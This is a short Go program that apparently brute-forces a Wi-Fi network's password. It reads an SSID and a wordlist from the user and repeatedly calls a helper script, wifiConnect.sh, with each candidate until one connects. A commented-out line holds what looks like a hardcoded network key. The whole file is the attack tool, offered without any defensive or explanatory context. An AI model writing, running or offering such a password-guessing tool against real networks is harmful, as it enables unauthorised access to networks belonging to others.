package main

import ("fmt"
        //"log"
        "os/exec"
	"bufio"
	"os"
)

func main(){

        //loop: for {
	i := 0
		var list string
        	var ssid string
        	var pass string
        	fmt.Print("ssid: ")
        	fmt.Scanln(&ssid)
        	fmt.Print("Password List: ")
        	fmt.Scanln(&list)

	loop: for {
		i++
		pass = readList(list, i-1)
		fuck := string(pass)
		/*if pass == "2W499E600186" {
			fmt.Println("succ")
			break loop
		} else {
			fmt.Println("wrong")
			continue loop
		}*/

		fmt.Println(pass)
		cmd := exec.Command("bash", "wifiConnect.sh", ssid, fuck)
		err := cmd.Run()
        	if err != nil {
			fmt.Println("wrong")
        	        continue loop
        	} else {
	
        	        fmt.Println("hello", i)
        	        break loop
        	}

        }


}

//indexes a string from the list
//path is the path to the config file. index is which row from the config file are you reading from
func readList(path string, index int) string {

        filePath := path
        readFile, err := os.Open(filePath)

        check(err)

        fileScanner := bufio.NewScanner(readFile)
        fileScanner.Split(bufio.ScanLines)
        var fileLines []string

        for fileScanner.Scan() {
                fileLines = append(fileLines, fileScanner.Text())
        }

        readFile.Close()

        return fileLines[index]

}

func check(e error) {

        if e != nil {
                panic(e)
        }

}

